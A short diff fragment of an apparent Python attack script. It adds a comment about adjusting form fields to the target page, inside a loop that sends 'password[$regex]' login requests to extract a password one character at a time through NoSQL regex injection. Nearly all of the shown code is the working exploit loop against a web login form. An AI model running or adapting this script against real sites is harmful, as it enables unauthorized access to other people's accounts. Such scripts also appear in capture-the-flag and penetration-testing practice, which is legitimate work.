@@ -17,6 +17,7 @@ while flag:
     #flag=False
     for letters in list:
        count+=1
+       ####Change the datas according to the Content of the web page
        datas={'username':username,'password[$regex]':password+letters,'login':'login'}
        req=requests.post(url,data=datas,allow_redirects=False)
        #print("Password sending is",password+letters)
